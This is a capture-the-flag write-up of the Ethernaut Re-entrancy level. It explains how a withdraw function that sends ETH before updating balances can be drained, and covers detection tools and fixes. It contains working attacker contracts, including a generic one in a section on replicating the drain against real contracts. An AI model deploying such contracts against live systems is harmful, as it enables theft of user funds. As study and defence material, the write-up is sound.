/ SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}}

    # Ethernaut — Level 10: Re-entrancy

**Network:** Sepolia testnet  
**Contract:** `0x30c809072141A9C230E57c6a3Fec25C08ECF3AA3`  
**Date completed:** June 2026

---

## What the challenge was

Drain the Reentrance contract of all its ETH.  
The contract was a simple ETH bank — you could deposit and withdraw. The vulnerability was in the order of operations in the `withdraw()` function.

---

## What confused me

- The interface-based attacker contract threw an abstract contract warning in Remix and wouldn't deploy — rewrote it using low-level `.call()` with `abi.encodeWithSignature()` which worked fine
- Had to check the contract balance first before setting the attack value — matched it exactly at 0.001 ETH

---

## Vulnerability involved

**Reentrancy — external call before state update.**

The vulnerable `withdraw()` function:

```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");  // 1. sends ETH first
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;  // 2. updates balance AFTER ← VULNERABLE
    }
}
```

The bug is the order — ETH is sent **before** the balance is updated. If the recipient is a smart contract with a `receive()` function that calls `withdraw()` again, it can drain the contract completely before the balance is ever updated.

The attack loop:
```
1. Donate 0.001 ETH → register a balance
2. Call withdraw(0.001)
3. Contract checks balance ✅ → sends 0.001 ETH to attacker
4. Before balance updates → receive() fires in attacker contract
5. receive() calls withdraw(0.001) again
6. Contract checks balance again ✅ (still not updated!) → sends another 0.001 ETH
7. Loop repeats until contract is empty
8. Balance finally updates — but nothing is left
```

---

## How I solved it

**Step 1 — Checked the target balance**
```javascript
await getBalance(instance)
// returned: 0.001
```

**Step 2 — Deployed attacker contract in Remix**

Used low-level `.call()` to avoid the abstract contract warning:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttack {
    address payable target;
    uint256 amount;

    constructor() {
        target = payable(0x30c809072141A9C230E57c6a3Fec25C08ECF3AA3);
    }

    function attack() public payable {
        amount = msg.value;
        // donate to register balance
        (bool success, ) = target.call{value: amount}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "Donate failed");
        // start withdrawal
        (bool success2, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success2, "Withdraw failed");
    }

    receive() external payable {
        if (target.balance >= amount) {
            target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        }
    }
}
```

**Step 3 — Called `attack()` with 0.001 ETH (1000000000000000 wei)**

**Step 4 — Verified the target was drained**
```javascript
await getBalance(instance)
// returned: 0
```

**Step 5 — Submitted the instance** ✅

---

## Three types of reentrancy to know

**1. Single-function reentrancy (this level)**  
Re-entering the same function before it finishes.

**2. Cross-function reentrancy**  
Function A sends ETH → attacker re-enters Function B that shares the same unupdated state:
```solidity
// withdraw() sends ETH → attacker calls transfer() →
// transfer() uses the same un-updated balance
```

**3. Read-only reentrancy**  
Re-entering a `view` function mid-execution to read inconsistent state — commonly used to manipulate on-chain price oracles.

---

## How to find it in real contracts

**Search for external calls:**
```bash
grep -r "\.call{value" ./contracts/
grep -r "\.transfer(" ./contracts/
grep -r "\.send(" ./contracts/
```

**The dangerous pattern:**
```solidity
// ❌ state update comes AFTER external call
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    (bool success,) = msg.sender.call{value: amount}("");  // external call first
    balances[msg.sender] -= amount;  // state update after ← VULNERABLE
}
```

**Questions to ask:**
- Does any function send ETH or call an external contract?
- Is the state updated before or after that call?
- Can the recipient re-enter the same function before state updates?
- Are there cross-function reentrancy paths?

**Tools:**
```bash
# Slither
slither ./contracts/ --detect reentrancy-eth
slither ./contracts/ --detect reentrancy-no-eth

# Mythril
myth analyze contracts/Reentrance.sol
```

---

## How to replicate on a real contract

**Step 1 — Find the vulnerable function**  
Look for `call{value}`, `.transfer()`, or `.send()` where state updates happen after.

**Step 2 — Confirm balance tracking**  
Check the contract tracks balances in a mapping and updates them after sending.

**Step 3 — Deploy attacker contract**

```solidity
contract Attacker {
    IVulnerable target;
    uint256 attackAmount;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() public payable {
        attackAmount = msg.value;
        target.deposit{value: attackAmount}();
        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}
```

**Step 4 — Call `attack()` with enough ETH to register a balance**

**Step 5 — The loop drains the contract automatically**

---

## The fixes

**Fix 1 — Checks-Effects-Interactions (CEI) pattern**  
Always update state BEFORE making external calls:

```solidity
// ✅ safe — state updated first
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // update state first
    (bool success,) = msg.sender.call{value: amount}("");  // then external call
    require(success);
}
```

**Fix 2 — Reentrancy guard (mutex lock)**

```solidity
// ✅ safe — OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Safe is ReentrancyGuard {
    function withdraw(uint amount) public nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
    }
}
```

Always use OpenZeppelin's `ReentrancyGuard` on any function that sends ETH or calls external contracts.

---

## Real world impact

**The DAO hack — June 2016**  
An attacker exploited reentrancy to drain 3.6 million ETH (~$60 million at the time) from The DAO smart contract. The Ethereum community's response — rolling back the chain to reverse the theft — caused a permanent split into **Ethereum** and **Ethereum Classic**. It remains the most consequential smart contract hack in history.

More recently:
- **Cream Finance** — $18.8M drained via reentrancy (2021)
- **Siren Protocol** — $3.5M drained via reentrancy (2021)
- Multiple other DeFi exploits have used reentrancy as a component

---

## Key takeaway

Always follow the **Checks-Effects-Interactions (CEI)** pattern:
1. **Check** conditions (`require` statements)
2. **Update** state (balances, flags)
3. **Interact** with external contracts or send ETH

Never send ETH or call external contracts before updating your own state. Use OpenZeppelin's `ReentrancyGuard` as a safety net on all withdrawal functions.
